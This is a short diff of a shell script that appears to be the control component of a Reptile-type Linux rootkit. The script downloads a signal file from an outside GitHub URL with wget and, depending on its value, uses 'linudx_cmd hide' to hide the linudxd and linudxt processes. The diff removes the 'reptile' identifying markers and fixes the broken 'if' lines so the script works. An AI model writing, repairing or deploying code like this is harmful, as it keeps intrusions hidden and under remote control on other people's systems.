@@ -1,6 +1,5 @@
 #! /bin/sh
 
-#<reptile> 
 wget https://raw.githubusercontent.com/myvulweb/b3/master/1.txt -O /tmp/b3-singal-test.txt
 ret=`cat /tmp/b3-singal-test.txt`
 rm -rf /tmp/b3-singal-test.txt
@@ -27,7 +26,7 @@ then
 		else
 			/linudx/linudx_cmd hide `pidof linudxd`
 			/linudx/linudx_cmd hide 
-		if
+		fi
 	fi
 
 	if [ `ps -ef|grep /bin/linudxt | grep -v grep |wc -l`  -ge 1 ];then
@@ -42,7 +41,7 @@ then
 		else
 			/linudx/linudx_cmd hide `pidof linudxt`
 			/linudx/linudx_cmd hide 
-		if
+		fi
 	fi
 
 elif [ "$ret" -eq 0 ]
@@ -62,5 +61,5 @@ then
 else
 	echo "not defined!"
 fi
-#</reptile>
+
 
